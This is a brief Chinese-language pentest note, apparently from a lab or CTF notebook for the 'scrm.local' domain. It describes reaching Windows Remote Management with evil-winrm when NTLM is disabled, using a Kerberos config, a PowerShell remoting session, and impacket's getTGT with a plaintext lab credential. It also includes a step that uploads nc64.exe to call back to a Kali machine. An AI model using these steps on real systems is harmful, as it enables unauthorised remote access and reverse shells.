用于 Windows 远程管理服务，基于 Web 服务的管理接口。

通常使用 evil-winrm 拿到 PS Session


### 如果网络上 NTLM 验证被禁用
**0x01**
- **pwsh**
/etc/krb5.conf
```
[libdefaults]
        default_realm = SCRM.LOCAL
# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        SCRM.LOCAL = {
                kdc = dc1.scrm.local
                admin_server = dc1.scrm.local
        }

[domain_realm]
```

```bash
sudo pwsh
Install-Module -Name PSWSMan -Scope AllUsers   (安装开放管理基础设施)
exit

pwsh
Enter-PSSession dc1.scrm.local -Credential UserName
登录后再上传nc64.exe 链接到Kali
```

**0x02**
- GetTGT.py
修改/etc/krb5.conf 后
```bash
└─$ python /usr/share/doc/python3-impacket/examples/getTGT.py scrm.local/MiscSvc:ScrambledEggs9900    Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                         [*] Saving ticket in MiscSvc.ccache

└─$ KRB5CCNAME=MiscSvc.ccache evil-winrm -r scrm.local -i dc1.scrm.local
```


**内网5985不对外开放，同时1433可以访问，拥有初始凭据即可使用 mssqlproxy 来进行连接 winrm**
[1433 - MsSql](1433%20-%20MsSql.md)
